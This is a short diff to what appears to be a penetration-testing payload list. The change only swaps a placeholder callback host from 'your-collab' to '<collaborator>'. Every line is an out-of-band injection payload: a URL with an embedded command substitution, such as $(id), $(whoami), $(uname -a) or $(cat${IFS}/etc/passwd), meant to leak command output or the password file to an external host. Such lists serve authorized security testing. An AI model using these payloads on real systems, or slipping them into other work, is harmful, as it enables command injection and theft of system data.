@@ -1,15 +1,15 @@
-https://your-collab
-https://your-collab:22
-https://your-collab:25
-http://your-collab/id``
-http://your-collab/$(id)
-http://your-collab/whoami``
-http://your-collab/$(whoami)
-http://your-collab/uname -a``
-http://your-collab/$(uname -a)
-http://your-collab/%24(id)
-http://your-collab/%24(whoami)
-http://your-collab/cat${IFS}/etc/passwd``
-http://your-collab/$(cat${IFS}/etc/passwd)
-http://your-collab/$(hostname)
-http://your-collab/$(ls${IFS}/home/)
+https://<collaborator>
+https://<collaborator>:22
+https://<collaborator>:25
+http://<collaborator>/id``
+http://<collaborator>/$(id)
+http://<collaborator>/whoami``
+http://<collaborator>/$(whoami)
+http://<collaborator>/uname -a``
+http://<collaborator>/$(uname -a)
+http://<collaborator>/%24(id)
+http://<collaborator>/%24(whoami)
+http://<collaborator>/cat${IFS}/etc/passwd``
+http://<collaborator>/$(cat${IFS}/etc/passwd)
+http://<collaborator>/$(hostname)
+http://<collaborator>/$(ls${IFS}/home/)
